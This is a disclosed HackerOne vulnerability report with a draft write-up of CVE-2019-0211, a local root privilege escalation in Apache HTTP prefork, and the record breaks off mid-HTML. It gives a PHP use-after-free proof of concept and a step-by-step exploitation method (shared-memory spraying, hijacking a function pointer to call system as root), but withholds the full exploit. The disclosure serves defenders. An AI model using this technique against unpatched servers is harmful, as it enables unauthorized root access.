{"id":520903,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjA5MDM=","url":"https://hackerone.com/reports/520903","title":"Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-02T15:17:43.204Z","submitted_at":"2019-04-02T15:17:43.204Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"real","url":"/real","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":26,"url":"https://hackerone.com/ibb-apache","handle":"ibb-apache","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Apache httpd (IBB)","twitter_handle":"","website":"http://apache.org/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-0211"],"singular_disclosure_disabled":false,"disclosed_at":"2019-09-11T09:46:31.808Z","bug_reporter_agreed_on_going_public_at":"2019-09-11T09:46:31.730Z","team_member_agreed_on_going_public_at":"2019-09-10T20:32:52.357Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nI reported a Local Root privilege escalation vulnerability on Apache HTTPd at the beginning of the year. Apache has now patched it, [as you can see here](https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2019-0211).\nThe vulnerability affects mod_prefork, mod_event, and mod_worker, the most used mods on Linux.\nBasically, this is an arbitrary function call as root triggered whenever the server gracefully restarts, which is generally once a day.\n\nHere is the article I plan to publish soon, as MarkDown (careful, wall of text):\n\n# Introduction\n\nFrom version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.\nThe vulnerability is triggered when Apache gracefully restarts (`apache2ctl graceful`).\nIn standard Linux configurations, the `logrotate` utility runs this command once a day, at 6:25AM, in order to reset log file handles.\n\n*The vulnerability affects `mod_prefork`, `mod_worker` and `mod_event`. The following bug description, code walkthrough and exploit target `mod_prefork`.*\n\n# Bug description\n\nIn MPM prefork, the main server process, running as `root`, manages a pool of single-threaded, low-privilege (`www-data`) worker processes, meant to handle HTTP requests.\nIn order to get feedback from its workers, Apache maintains a shared-memory area (SHM), `scoreboard`, which contains various informations such as the workers PIDs and the last request they handled.\nEach worker is meant to maintain a `process_score` structure associated with its PID, and has full read/write access to the SHM.\n\n*ap_scoreboard_image: pointers to the shared memory block*\n```\n(gdb) p *ap_scoreboard_image \n$3 = {\n  global = 0x7f4a9323e008, \n  parent = 0x7f4a9323e020, \n  servers = 0x55835eddea78\n}\n(gdb) p ap_scoreboard_image-\u003eservers[0]\n$5 = (worker_score *) 0x7f4a93240820\n```\n\n*Example of shared memory associated with worker PID 19447*\n```\n(gdb) p ap_scoreboard_image-\u003eparent[0]\n$6 = {\n  pid = 19447, \n  generation = 0, \n  quiescing = 0 '\\000', \n  not_accepting = 0 '\\000', \n  connections = 0, \n  write_completion = 0, \n  lingering_close = 0, \n  keep_alive = 0, \n  suspended = 0, \n  bucket = 0 \u003c- index for all_buckets\n}\n(gdb) ptype *ap_scoreboard_image-\u003eparent\ntype = struct process_score {\n    pid_t pid;\n    ap_generation_t generation;\n    char quiescing;\n    char not_accepting;\n    apr_uint32_t connections;\n    apr_uint32_t write_completion;\n    apr_uint32_t lingering_close;\n    apr_uint32_t keep_alive;\n    apr_uint32_t suspended;\n    int bucket; \u003c- index for all_buckets\n}\n```\n\nWhen Apache gracefully restarts, its main process kills old workers and replaces them by new ones.\nAt this point, every old worker's `bucket` value will be used by the main process to access an array of his, `all_buckets`.\n\n*all_buckets*\n```\n(gdb) p $index = ap_scoreboard_image-\u003eparent[0]-\u003ebucket\n(gdb) p all_buckets[$index]\n$7 = {\n  pod = 0x7f19db2c7408, \n  listeners = 0x7f19db35e9d0, \n  mutex = 0x7f19db2c7550\n}\n(gdb) ptype all_buckets[$index]\ntype = struct prefork_child_bucket {\n    ap_pod_t *pod;\n    ap_listen_rec *listeners;\n    apr_proc_mutex_t *mutex; \u003c--\n}\n(gdb) ptype apr_proc_mutex_t\napr_proc_mutex_t {\n    apr_pool_t *pool;\n    const apr_proc_mutex_unix_lock_methods_t *meth; \u003c--\n    int curr_locked;\n    char *fname;\n    ...\n}\n(gdb) ptype apr_proc_mutex_unix_lock_methods_t\napr_proc_mutex_unix_lock_methods_t {\n    ...\n    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); \u003c--\n    ...\n}\n```\n\nNo bound checks happen. Therefore, a rogue worker can change its `bucket` index and make it point to the shared memory, in order to control the `prefork_child_bucket` structure upon restart. Eventually, and before privileges are dropped, `mutex-\u003emeth-\u003echild_init()` is called.\nThis results in an **arbitrary function call as root**.\n\n# Vulnerable code\n\nWe'll go through `server/mpm/prefork/prefork.c` to find out where and how the bug happens.\n\n- A rogue worker changes its `bucket` index in shared memory to make it point to a structure of his, also in SHM.\n- At 06:25AM the next day, `logrotate` requests a graceful restart from Apache.\n- Upon this, the main Apache process will first kill workers, and then spawn new ones.\n- The killing is done by sending `SIGUSR1` to workers. They are expected to exit ASAP.\n- Then, `prefork_run()` ([L853](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L853)) is called to spawn new workers. Since `retained-\u003empm-\u003ewas_graceful` is `true` ([L861](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L861)), workers are not restarted straight away.\n- Instead, we enter the main loop ([L933](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L933)) and monitor dead workers' PIDs. When an old worker dies, `ap_wait_or_timeout()` returns its PID ([L940](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L940)).\n- The index of the `process_score` structure associated with this PID is stored in `child_slot` ([L948](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L948)).\n- If the death of this worker was not fatal ([L969](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L969)), `make_child()` is called with `ap_get_scoreboard_process(child_slot)-\u003ebucket` as a third argument ([L985](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L985)). As previously said, `bucket`'s value has been changed by a rogue worker.\n- `make_child()` creates a new child, `fork()`ing ([L671](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L671)) the main process.\n- The OOB read happens ([L691](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691)), and `my_bucket` is therefore under the control of an attacker.\n- `child_main()` is called ([L722](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L722)), and the function call happens a bit further ([L433](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433)).\n- `SAFE_ACCEPT(\u003ccode\u003e)` will only execute `\u003ccode\u003e` if Apache listens *on two ports or more*, which is often the case since a server listens over HTTP (80) and HTTPS (443).\n- Assuming `\u003ccode\u003e` is executed, `apr_proc_mutex_child_init()` is called, which results in a call to `(*mutex)-\u003emeth-\u003echild_init(mutex, pool, fname)` with mutex under control.\n- Privileges are dropped a bit later in the execution ([L446](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L446)).\n\n# Exploitation\n\nThe exploitation is a four step process:\n1. Obtain R/W access on a worker process\n2. Write a fake `prefork_child_bucket` structure in the SHM\n3. Make `all_buckets[bucket]` point to the structure\n4. Await 6:25AM to get an arbitrary function call\n\nAdvantages:\n- The main process never exits, so we know where everything is mapped by reading `/proc/self/maps` (ASLR/PIE useless)\n- When a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache\n\nProblems:\n- PHP does not allow to read/write `/proc/self/mem`, which blocks us from simply editing the SHM\n- `all_buckets` is reallocated after a graceful restart (!)\n\n## 1. Obtain R/W access on a worker process\n\n### PHP UAF 0-day\n\nSince `mod_prefork` is often used in combination with `mod_php`, it seems natural to exploit the vulnerability through PHP. [CVE-2019-6977]() would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):\n\n*PHP UAF*\n```php\n\u003c?php\n\nclass X extends DateInterval implements JsonSerializable\n{\n  public function jsonSerialize()\n  {\n    global $y, $p;\n    unset($y[0]);\n    $p = $this-\u003ey;\n    return $this;\n  }\n}\n\nfunction get_aslr()\n{\n  global $p, $y;\n  $p = 0;\n\n  $y = [new X('PT1S')];\n  json_encode([1234 =\u003e \u0026$y]);\n  print(\"ADDRESS: 0x\" . dechex($p) . \"\\n\");\n\n  return $p;\n}\n\nget_aslr();\n```\n\nThis is an UAF on a PHP object: we unset `$y[0]` (an instance of `X`), but it is still usable using `$this`.\n\n### UAF to Read/Write\n\nWe want to achieve two things:\n- Read memory to find `all_buckets`' address\n- Edit the SHM to change `bucket` index and add our custom mutex structure\n\nLuckily for us, PHP's heap is located before those two in memory.\n\n*Memory addresses of PHP's heap, `ap_scoreboard_image-\u003e*` and `all_buckets`*\n```\nroot@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p\n7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so\n\n(gdb) p *ap_scoreboard_image \n$14 = {\n  global = 0x7f4a9323e008, \n  parent = 0x7f4a9323e020, \n  servers = 0x55835eddea78\n}\n(gdb) p all_buckets \n$15 = (prefork_child_bucket *) 0x7f4a9336b3f0\n```\n\nSince we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this `zend_object` UAF into a `zend_string` one.\nThis is useful because of `zend_string`'s structure:\n\n```\n(gdb) ptype zend_string\ntype = struct _zend_string {\n    zend_refcounted_h gc;\n    zend_ulong h;\n    size_t len;\n    char val[1];\n}\n```\n\nThe `len` property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we're interested in: the SHM and Apache's `all_buckets`.\n\n### Locating `bucket` indexes and `all_buckets`\n\nWe want to change `ap_scoreboard_image-\u003eparent[worker_id]-\u003ebucket` for a certain `worker_id`. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.\n\n*Shared memory location and targeted process_score structures*\n```\nroot@apaubuntu:~# cat /proc/6318/maps | grep rw-s\n7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)\n\n(gdb) p \u0026ap_scoreboard_image-\u003eparent[0]\n$18 = (process_score *) 0x7f4a9323e020\n(gdb) p \u0026ap_scoreboard_image-\u003eparent[1]\n$19 = (process_score *) 0x7f4a9323e044\n```\n\nTo locate `all_buckets`, we can make use of our knowledge of the `prefork_child_bucket` structure. We have:\n\n*Important structures of bucket items*\n```\nprefork_child_bucket {\n    ap_pod_t *pod;\n    ap_listen_rec *listeners;\n    apr_proc_mutex_t *mutex; \u003c--\n}\n\napr_proc_mutex_t {\n    apr_pool_t *pool;\n    const apr_proc_mutex_unix_lock_methods_t *meth; \u003c--\n    int curr_locked;\n    char *fname;\n\n    ...\n}\n\napr_proc_mutex_unix_lock_methods_t {\n    unsigned int flags;\n    apr_status_t (*create)(apr_proc_mutex_t *, const char *);\n    apr_status_t (*acquire)(apr_proc_mutex_t *);\n    apr_status_t (*tryacquire)(apr_proc_mutex_t *);\n    apr_status_t (*release)(apr_proc_mutex_t *);\n    apr_status_t (*cleanup)(void *);\n    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); \u003c--\n    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);\n    apr_lockmech_e mech;\n    const char *name;\n}\n```\n\n`all_buckets[0]-\u003emutex` will be located in the same memory region as `all_buckets[0]`. Since `meth` is a static structure, it will be located in `libapr`'s `.data`. Since `meth` points to functions defined in `libapr`, each of the function pointers will be located in `libapr`'s `.text`.\n\nSince we have knowledge of those region's addresses through `/proc/self/maps`, we can go through every pointer in Apache's memory and find one that matches the structure. It will be `all_buckets[0]`.\n\nAs I mentioned, `all_buckets`'s address changes at every graceful restart. This means that when our exploit triggers, `all_buckets`'s address will be different than the one we found. This has to be taken into account; we'll talk about this later.\n\n## 2. Write a fake `prefork_child_bucket` structure in the SHM\n\n### Reaching the function call\n\nThe code path to the arbitrary function call is the following:\n\n```\nbucket_id = ap_scoreboard_image-\u003eparent[id]-\u003ebucket\nmy_bucket = all_buckets[bucket_id]\nmutex = \u0026my_bucket-\u003emutex\napr_proc_mutex_child_init(mutex)\n(*mutex)-\u003emeth-\u003echild_init(mutex, pool, fname)\n```\n\n![Call:reach](images/carpe-diem-cve-2019-0211-apache-local-root/1.png)\n\n### Calling something proper\n\nTo exploit, we make `(*mutex)-\u003emeth-\u003echild_init` point to `zend_object_std_dtor(zend_object *object)`, which yields the following chain:\n\n```\nmutex = \u0026my_bucket-\u003emutex\n[object = mutex]\nzend_object_std_dtor(object)\nht = object-\u003eproperties\nzend_array_destroy(ht)\nzend_hash_destroy(ht)\nval = \u0026ht-\u003earData[0]-\u003eval\nht-\u003epDestructor(val)\n```\n\n`pDestructor` is set to `system`, and `\u0026ht-\u003earData[0]-\u003eval` is a string.\n\n![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/2.png)\n\nAs you can see, both leftmost structures are superimposed.\n\n## 3. Make `all_buckets[bucket]` point to the structure\n\n### Problem and solution\n\nRight now, if `all_buckets`' address was unchanged in between restarts, our exploit would be over:\n\n- Get R/W over all memory after PHP's heap\n- Find `all_buckets` by matching its structure\n- Put our structure in the SHM\n- Change one of the `process_score.bucket` in the SHM so that `all_bucket[bucket]-\u003emutex` points to our payload\n\nAs `all_buckets`' address changes, we can do two things to improve reliability: spray the SHM and use every `process_score` structure - one for each PID.\n\n### Spraying the shared memory\n\nIf `all_buckets`' new address is not far from the old one, `my_bucket` will point close to our structure. Therefore, instead of having our `prefork_child_bucket` structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the\nstructure is also used as a `zend_object`, and therefore it has a size of (5 * 8 =) 40 bytes to include `zend_object.properties`.\nSpraying a structure that big over a space this small won't help us much.\nTo solve this problem, we superimpose the two center structures, `apr_proc_mutex_t` and `zend_array`, and spray their address in the rest of the shared memory.\nThe impact will be that `prefork_child_bucket.mutex` and `zend_object.properties` point to the same address.\nNow, if `all_bucket` is relocated not too far from its original address, `my_bucket` will be in the sprayed area.\n\n![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/3.png)\n\n### Using every `process_score`\n\nEach Apache worker has an associated `process_score` structure, and with it a `bucket` index.\nInstead of changing one `process_score.bucket` value, we can change every one of them, so that they cover another part of memory. For instance:\n\n```\nap_scoreboard_image-\u003eparent[0]-\u003ebucket = -10000 -\u003e 0x7faabbcc00 \u003c= all_buckets \u003c= 0x7faabbdd00\nap_scoreboard_image-\u003eparent[1]-\u003ebucket = -20000 -\u003e 0x7faabbdd00 \u003c= all_buckets \u003c= 0x7faabbff00\nap_scoreboard_image-\u003eparent[2]-\u003ebucket = -30000 -\u003e 0x7faabbff00 \u003c= all_buckets \u003c= 0x7faabc0000\n```\n\nThis multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid `bucket` number, but this is not a problem because the others will crash, and immediately respawn.\n\n### Success rate\n\nDifferent Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more `index` for `all_buckets`. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had **~80% success rate**.\n\nAgain, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache's `error.log` will nevertheless contain notifications about its workers segfaulting.\n\n## 4. Await 6:25AM for the exploit to trigger\n\nWell, that's the easy step.\n\n# Vulnerability timeline\n\n- 2019-02-22 Initial contact email to `security[at]apache[dot]org`, with description and POC\n- 2019-02-25 Acknowledgment of the vulnerability, working on a fix\n- 2019-03-07 Apache's security team sends a patch for I to review, CVE assigned\n- 2019-03-10 I approve the patch\n- 2019-04-01 Apache HTTP version 2.4.39 released\n\nApache's team has been prompt to respond and patch, and nice as hell. Really good experience. PHP never answered regarding the UAF.\n\n# Exploit\n\nI'm not releasing it just yet !\n\n## Impact\n\nYou generally obtain root privileges from www-data privileges.","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI reported a Local Root privilege escalation vulnerability on Apache HTTPd at the beginning of the year. Apache has now patched it, \u003ca href=\"/redirect?url=https%3A%2F%2Fhttpd.apache.org%2Fsecurity%2Fvulnerabilities_24.html%23CVE-2019-0211\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eas you can see here\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nThe vulnerability affects mod_prefork, mod_event, and mod_worker, the most used mods on Linux.\u003cbr\u003e\nBasically, this is an arbitrary function call as root triggered whenever the server gracefully restarts, which is generally once a day.\u003c/p\u003e\n\n\u003cp\u003eHere is the article I plan to publish soon, as MarkDown (careful, wall of text):\u003c/p\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eFrom version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.\u003cbr\u003e\nThe vulnerability is triggered when Apache gracefully restarts (\u003ccode\u003eapache2ctl graceful\u003c/code\u003e).\u003cbr\u003e\nIn standard Linux configurations, the \u003ccode\u003elogrotate\u003c/code\u003e utility runs this command once a day, at 6:25AM, in order to reset log file handles.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eThe vulnerability affects \u003ccode\u003emod_prefork\u003c/code\u003e, \u003ccode\u003emod_worker\u003c/code\u003e and \u003ccode\u003emod_event\u003c/code\u003e. The following bug description, code walkthrough and exploit target \u003ccode\u003emod_prefork\u003c/code\u003e.\u003c/em\u003e\u003c/p\u003e\n\n\u003ch1 id=\"bug-description\"\u003eBug description\u003c/h1\u003e\n\n\u003cp\u003eIn MPM prefork, the main server process, running as \u003ccode\u003eroot\u003c/code\u003e, manages a pool of single-threaded, low-privilege (\u003ccode\u003ewww-data\u003c/code\u003e) worker processes, meant to handle HTTP requests.\u003cbr\u003e\nIn order to get feedback from its workers, Apache maintains a shared-memory area (SHM), \u003ccode\u003escoreboard\u003c/code\u003e, which contains various informations such as the workers PIDs and the last request they handled.\u003cbr\u003e\nEach worker is meant to maintain a \u003ccode\u003eprocess_score\u003c/code\u003e structure associated with its PID, and has full read/write access to the SHM.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eap_scoreboard_image: pointers to the shared memory block\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) p *ap_scoreboard_image \n$3 = {\n  global = 0x7f4a9323e008, \n  parent = 0x7f4a9323e020, \n  servers = 0x55835eddea78\n}\n(gdb) p ap_scoreboard_image-\u0026gt;servers[0]\n$5 = (worker_score *) 0x7f4a93240820\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eExample of shared memory associated with worker PID 19447\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) p ap_scoreboard_image-\u0026gt;parent[0]\n$6 = {\n  pid = 19447, \n  generation = 0, \n  quiescing = 0 \u0026#39;\\000\u0026#39;, \n  not_accepting = 0 \u0026#39;\\000\u0026#39;, \n  connections = 0, \n  write_completion = 0, \n  lingering_close = 0, \n  keep_alive = 0, \n  suspended = 0, \n  bucket = 0 \u0026lt;- index for all_buckets\n}\n(gdb) ptype *ap_scoreboard_image-\u0026gt;parent\ntype = struct process_score {\n    pid_t pid;\n    ap_generation_t generation;\n    char quiescing;\n    char not_accepting;\n    apr_uint32_t connections;\n    apr_uint32_t write_completion;\n    apr_uint32_t lingering_close;\n    apr_uint32_t keep_alive;\n    apr_uint32_t suspended;\n    int bucket; \u0026lt;- index for all_buckets\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen Apache gracefully restarts, its main process kills old workers and replaces them by new ones.\u003cbr\u003e\nAt this point, every old worker\u0026#39;s \u003ccode\u003ebucket\u003c/code\u003e value will be used by the main process to access an array of his, \u003ccode\u003eall_buckets\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eall_buckets\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) p $index = ap_scoreboard_image-\u0026gt;parent[0]-\u0026gt;bucket\n(gdb) p all_buckets[$index]\n$7 = {\n  pod = 0x7f19db2c7408, \n  listeners = 0x7f19db35e9d0, \n  mutex = 0x7f19db2c7550\n}\n(gdb) ptype all_buckets[$index]\ntype = struct prefork_child_bucket {\n    ap_pod_t *pod;\n    ap_listen_rec *listeners;\n    apr_proc_mutex_t *mutex; \u0026lt;--\n}\n(gdb) ptype apr_proc_mutex_t\napr_proc_mutex_t {\n    apr_pool_t *pool;\n    const apr_proc_mutex_unix_lock_methods_t *meth; \u0026lt;--\n    int curr_locked;\n    char *fname;\n    ...\n}\n(gdb) ptype apr_proc_mutex_unix_lock_methods_t\napr_proc_mutex_unix_lock_methods_t {\n    ...\n    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); \u0026lt;--\n    ...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNo bound checks happen. Therefore, a rogue worker can change its \u003ccode\u003ebucket\u003c/code\u003e index and make it point to the shared memory, in order to control the \u003ccode\u003eprefork_child_bucket\u003c/code\u003e structure upon restart. Eventually, and before privileges are dropped, \u003ccode\u003emutex-\u0026gt;meth-\u0026gt;child_init()\u003c/code\u003e is called.\u003cbr\u003e\nThis results in an \u003cstrong\u003earbitrary function call as root\u003c/strong\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"vulnerable-code\"\u003eVulnerable code\u003c/h1\u003e\n\n\u003cp\u003eWe\u0026#39;ll go through \u003ccode\u003eserver/mpm/prefork/prefork.c\u003c/code\u003e to find out where and how the bug happens.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eA rogue worker changes its \u003ccode\u003ebucket\u003c/code\u003e index in shared memory to make it point to a structure of his, also in SHM.\u003c/li\u003e\n\u003cli\u003eAt 06:25AM the next day, \u003ccode\u003elogrotate\u003c/code\u003e requests a graceful restart from Apache.\u003c/li\u003e\n\u003cli\u003eUpon this, the main Apache process will first kill workers, and then spawn new ones.\u003c/li\u003e\n\u003cli\u003eThe killing is done by sending \u003ccode\u003eSIGUSR1\u003c/code\u003e to workers. They are expected to exit ASAP.\u003c/li\u003e\n\u003cli\u003eThen, \u003ccode\u003eprefork_run()\u003c/code\u003e (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L853\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL853\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) is called to spawn new workers. Since \u003ccode\u003eretained-\u0026gt;mpm-\u0026gt;was_graceful\u003c/code\u003e is \u003ccode\u003etrue\u003c/code\u003e (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L861\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL861\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), workers are not restarted straight away.\u003c/li\u003e\n\u003cli\u003eInstead, we enter the main loop (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L933\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL933\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and monitor dead workers\u0026#39; PIDs. When an old worker dies, \u003ccode\u003eap_wait_or_timeout()\u003c/code\u003e returns its PID (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L940\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL940\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003eThe index of the \u003ccode\u003eprocess_score\u003c/code\u003e structure associated with this PID is stored in \u003ccode\u003echild_slot\u003c/code\u003e (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L948\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL948\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003eIf the death of this worker was not fatal (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L969\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL969\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), \u003ccode\u003emake_child()\u003c/code\u003e is called with \u003ccode\u003eap_get_scoreboard_process(child_slot)-\u0026gt;bucket\u003c/code\u003e as a third argument (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L985\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL985\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). As previously said, \u003ccode\u003ebucket\u003c/code\u003e\u0026#39;s value has been changed by a rogue worker.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003emake_child()\u003c/code\u003e creates a new child, \u003ccode\u003efork()\u003c/code\u003eing (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L671\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL671\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) the main process.\u003c/li\u003e\n\u003cli\u003eThe OOB read happens (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L691\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL691\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), and \u003ccode\u003emy_bucket\u003c/code\u003e is therefore under the control of an attacker.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003echild_main()\u003c/code\u003e is called (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L722\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL722\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), and the function call happens a bit further (\u003ca 